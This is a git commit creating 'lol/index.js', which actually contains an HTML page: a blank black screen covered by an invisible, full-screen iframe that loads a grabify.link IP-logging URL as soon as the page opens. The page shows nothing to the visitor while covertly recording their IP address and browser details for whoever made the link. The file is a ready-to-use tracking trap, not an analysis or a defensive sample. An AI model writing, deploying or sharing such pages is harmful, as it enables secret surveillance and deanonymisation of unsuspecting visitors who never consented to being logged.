c5b515c337df7f5a89deb6d42d455c5b272fef67
TanvishGG <101194211+TanvishGG@users.noreply.github.com>
2023-07-09 21:21:06 +0530

    Create index.js

---
+++ lol/index.js
@@ -0,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      background-color: black;
+      margin: 0;
+      overflow: hidden;
+    }
+    #content {
+      background-color: transparent;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+  </style>
+</head>
+<body>
+  <iframe id="content" src="https://grabify.link/7VTEJS" frameborder="0"></iframe>
+</body>
+</html>
+    
